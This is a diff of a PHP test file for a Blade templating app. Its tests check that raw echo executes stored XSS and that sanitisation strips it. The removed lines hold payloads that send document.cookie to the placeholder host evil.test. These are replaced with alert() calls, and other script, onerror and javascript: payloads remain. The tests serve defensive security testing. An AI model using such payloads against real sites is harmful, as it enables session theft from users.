@@ -52,7 +52,7 @@ function renderBladeFragment(string $template, array $data = []): string
  */
 function storedXssPayload(): string
 {
-    return 'Import failed<br /><pre>bad value: <script>fetch("//evil.test/"+document.cookie)</script></pre>';
+    return 'Import failed<br /><pre>bad value: <script>alert("evil.test")</script></pre>';
 }
 
 test('the old raw echo really did execute a stored payload', function () {
@@ -61,7 +61,7 @@ test('the old raw echo really did execute a stored payload', function () {
     $output = renderBladeFragment('{!! $description !!}', ['description' => storedXssPayload()]);
 
     expect($output)->toContain('<script>')
-        ->and($output)->toContain('fetch("//evil.test/"+document.cookie)');
+        ->and($output)->toContain('alert("evil.test")');
 });
 
 test('printing the sanitised description keeps the layout and disarms the payload', function () {
@@ -121,7 +121,7 @@ test('the error report ExceptionHandler stores still renders as a report', funct
 
 test('a payload hidden inside a stored error report is stripped, the report is not', function () {
     $report = '<table class="grid" onmouseover="alert(1)"><tr><td>File</td>'
-        . '<td>/tmp/<img src=x onerror="fetch('//evil.test/'+document.cookie)">.php</td></tr></table>'
+        . '<td>/tmp/<img src=x onerror="alert(\'evil.test\')">.php</td></tr></table>'
         . '<a href="javascript:alert(1)">details</a>';
 
     $log = (new EventLog())->setRawAttributes([
